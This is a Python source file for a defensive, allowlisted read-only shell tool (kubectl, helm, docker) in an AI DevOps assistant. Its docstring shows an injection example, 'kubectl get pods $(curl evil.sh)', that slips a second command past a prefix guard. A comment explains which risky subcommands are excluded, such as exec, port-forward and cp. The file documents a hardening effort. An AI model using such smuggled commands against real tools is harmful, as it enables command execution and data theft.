"""Allowlisted read-only shell access for DevOps CLIs.

Replaces MCP's ``run_shell``, whose guard was::

    allowed_prefixes = ['kubectl ', 'docker ', 'helm ']
    if not any(cmd.strip().startswith(p) for p in allowed_prefixes): ...
    if any(tok in cmd for tok in [';', '|', '>', '<']): ...

That is string matching on a command line, and it leaks in both directions.
``kubectl get pods $(curl evil.sh)`` starts with an allowed prefix and contains
none of the blocked characters. So does a backtick substitution, and so does
anything after a newline.

The rewrite never lets a shell see the string at all:

- ``shlex.split`` turns it into an argv list, so shell metacharacters are inert
  by construction — there is no shell to interpret them.
- argv[0] must be in the binary allowlist, matched exactly, not by prefix.
- the subcommand must be in that binary's read-only allowlist, so ``kubectl
  delete`` is rejected even though ``kubectl`` is permitted.
- ``subprocess.run`` is called with a list and ``shell=False``.

The tool is off by default (``ENABLE_SHELL_TOOL``). Everything it can read is
also available through the Kubernetes tool, which talks to the API directly.
"""

import asyncio
import logging
import shlex
import subprocess
from typing import Any

from ai_devops_assistant.config.settings import settings
from ai_devops_assistant.tools.base import BaseTool

logger = logging.getLogger(__name__)

# Read-only subcommands only. Anything that mutates cluster state, executes into
# a container, or opens a tunnel is absent on purpose:
#   exec/attach     -> arbitrary execution inside a pod
#   port-forward/proxy -> a network tunnel out of the cluster
#   apply/delete/patch/edit/scale/drain -> mutation
#   cp              -> file exfiltration
ALLOWED_COMMANDS: dict[str, frozenset[str]] = {
    "kubectl": frozenset({"get", "describe", "logs", "top", "version", "api-resources", "explain"}),
    "helm": frozenset({"list", "status", "history", "get", "version", "search"}),
    "docker": frozenset({"ps", "images", "inspect", "logs", "version", "stats"}),
}

DEFAULT_TIMEOUT_SECONDS = 30
MAX_OUTPUT_CHARS = 20_000


class ShellTool(BaseTool):
    """Run a narrow set of read-only DevOps commands."""

    def __init__(self, timeout: int = DEFAULT_TIMEOUT_SECONDS):
        """Initialize shell tool."""
        super().__init__(
            name="shell_tool",
            description=(
                "Run read-only DevOps commands (kubectl, helm, docker). "
                "Only inspection subcommands are permitted."
            ),
        )
        self.timeout = timeout

    def validate_command(self, command: str) -> tuple[bool, str | None, list[str]]:
        """Parse and authorise a command.

        Returns:
            (is_allowed, error_message, argv)
        """
        if not isinstance(command, str) or not command.strip():
            return False, "Command must be a non-empty string", []

        # Reject before parsing: a newline lets a second command ride along in
        # anything that later re-joins argv, and shlex would silently accept it.
        if "\n" in command or "\r" in command:
            return False, "Command must be a single line", []

        try:
            argv = shlex.split(command)
        except ValueError as e:
            # Unbalanced quotes and similar. Refuse rather than guess.
            return False, f"Could not parse command: {e}", []

        if not argv:
            return False, "Command must be a non-empty string", []

        binary = argv[0]
        if binary not in ALLOWED_COMMANDS:
            return (
                False,
                f"Command not permitted: {binary}. Allowed: {', '.join(sorted(ALLOWED_COMMANDS))}",
                [],
            )

        if len(argv) < 2:
            return False, f"{binary} requires a subcommand", []

        subcommand = argv[1]
        allowed_subcommands = ALLOWED_COMMANDS[binary]
        if subcommand not in allowed_subcommands:
            return (
                False,
                (
                    f"Subcommand not permitted: {binary} {subcommand}. "
                    f"Allowed: {', '.join(sorted(allowed_subcommands))}"
                ),
                [],
            )

        return True, None, argv

    def validate_parameters(self, **kwargs) -> tuple[bool, str | None]:
        """Validate tool parameters."""
        if not settings.ENABLE_SHELL_TOOL:
            return False, "Shell tool is disabled"

        if "command" not in kwargs:
            return False, "Missing 'command' parameter"

        is_allowed, error, _ = self.validate_command(kwargs["command"])
        return is_allowed, error

    # Narrows BaseTool.execute(**kwargs) to this tool's named parameters. The
    # registry always dispatches by keyword and validate_parameters() guards the
    # required ones, so the narrowing is deliberate; mypy cannot express it.
    async def execute(self, command: str, **kwargs) -> dict[str, Any]:  # type: ignore[override]
        """Run an allowlisted command.

        Args:
            command: The command line to run.
            **kwargs: Additional parameters (unused).

        Returns:
            dict: stdout, stderr and exit code, or an error.
        """
        if not settings.ENABLE_SHELL_TOOL:
            return {"success": False, "error": "Shell tool is disabled"}

        is_allowed, error, argv = self.validate_command(command)
        if not is_allowed:
            logger.warning(f"Refused shell command: {command!r} ({error})")
            return {"success": False, "error": error}

        logger.info(f"Running allowlisted command: {argv}")

        try:
            # shell=False and a list argv: the string is never handed to a shell,
            # so metacharacters in arguments are literal data.
            completed = await asyncio.to_thread(
                subprocess.run,
                argv,
                capture_output=True,
                text=True,
                timeout=self.timeout,
                shell=False,
                check=False,
            )
        except FileNotFoundError:
            return {"success": False, "error": f"Command not found: {argv[0]}"}
        except subprocess.TimeoutExpired:
            return {"success": False, "error": f"Command timed out after {self.timeout}s"}
        except Exception as e:
            logger.error(f"Shell command failed: {e}")
            return {"success": False, "error": f"Command failed: {e}"}

        return {
            "success": completed.returncode == 0,
            "exit_code": completed.returncode,
            "stdout": completed.stdout[:MAX_OUTPUT_CHARS],
            "stderr": completed.stderr[:MAX_OUTPUT_CHARS],
            "truncated": len(completed.stdout) > MAX_OUTPUT_CHARS,
        }

    def get_schema(self) -> dict[str, Any]:
        """Get tool schema for LLM."""
        allowed = ", ".join(
            f"{binary} ({'|'.join(sorted(subs))})" for binary, subs in ALLOWED_COMMANDS.items()
        )
        return {
            "name": self.name,
            "description": self.description,
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": f"Read-only command to run. Permitted: {allowed}",
                    },
                },
                "required": ["command"],
            },
        }
